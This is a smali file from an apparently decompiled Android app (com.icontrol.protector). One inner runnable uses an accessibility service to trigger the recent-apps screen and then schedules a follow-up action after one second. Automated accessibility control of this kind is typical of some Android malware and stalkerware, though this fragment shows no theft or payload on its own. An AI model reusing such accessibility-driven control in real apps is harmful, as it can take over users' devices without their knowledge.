.class Lcom/icontrol/protector/m$d$a;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/icontrol/protector/m$d;->run()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic e:Lcom/icontrol/protector/m$d;


# direct methods
.method constructor <init>(Lcom/icontrol/protector/m$d;)V
    .locals 0

    iput-object p1, p0, Lcom/icontrol/protector/m$d$a;->e:Lcom/icontrol/protector/m$d;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 4

    sget-object v0, Lcom/icontrol/protector/m;->a:Lcom/icontrol/protector/AccessServices;

    const/4 v1, 0x3

    invoke-virtual {v0, v1}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    new-instance v1, Lcom/icontrol/protector/m$d$a$a;

    invoke-direct {v1, p0}, Lcom/icontrol/protector/m$d$a$a;-><init>(Lcom/icontrol/protector/m$d$a;)V

    const-wide/16 v2, 0x3e8

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method
